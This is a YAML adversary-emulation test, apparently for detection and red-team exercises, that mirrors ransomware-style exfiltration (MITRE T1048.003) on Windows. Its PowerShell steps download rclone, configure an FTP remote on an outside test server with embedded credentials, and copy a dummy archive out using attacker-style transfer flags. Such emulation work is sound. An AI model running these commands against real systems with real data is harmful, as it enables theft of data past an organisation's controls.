api_version: "2.0"
name: Exfiltration Over Alternative Protocol - FTP - Rclone
description: |-
    Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.
    [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)
args:
    - name: ftp_server
      type: string
      default: ftp.dlptest.com
    - name: ftp_pass
      type: string
      default: rNrKYTX9g7z3RgJRmxWuGHbeu
    - name: ftp_user
      type: string
      default: dlpuser
    - name: ftp_port
      type: int
      default: "21"
uuid: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1048: Exfiltration Over Alternative Protocol'
    subtechniques:
        - 'T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Check if the exfil package exists
      inline: |
        if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {{fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
        }}
      executor: powershell
    - name: Check if rclone zip exists
      inline: |
        if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {{Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
        Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath C:\Users\Public\Downloads\
        }}
      executor: powershell
    - name: exfiltration-over-alternative-protocol---ftp---rclone
      inline: |-
        $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
        $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName
        &$rclone_bin config create ftpserver "ftp" "host" {{.Args.ftp_server}} "port" {{.Args.ftp_port}} "user" {{.Args.ftp_user}} "pass" {{.Args.ftp_pass}}
        &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
